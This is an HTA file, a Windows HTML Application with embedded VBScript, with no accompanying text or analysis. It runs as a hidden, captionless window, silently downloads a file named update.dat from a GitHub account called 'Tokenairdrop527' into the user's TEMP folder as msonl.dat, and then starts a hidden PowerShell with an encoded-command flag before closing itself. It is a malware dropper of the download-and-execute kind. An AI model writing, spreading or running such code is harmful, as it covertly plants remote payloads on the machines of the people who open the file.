<html><head><HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize" CAPTION="no"/>
<script language="VBScript">
On Error Resume Next
Dim http, st, ws, tmp
tmp = Environ("TEMP") & "\msonl.dat"
Set http = CreateObject("MSXML2.XMLHTTP.6.0")
http.Open "GET", "https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat", False
http.Send
Set st = CreateObject("ADODB.Stream")
st.Type = 1
st.Open
st.Write http.responseBody
st.SaveToFile tmp, 2
st.Close
Set ws = CreateObject("WScript.Shell")
ws.Run "powershell -nop -w h -enc ", 0, False
self.close
</script></head><body></body></html>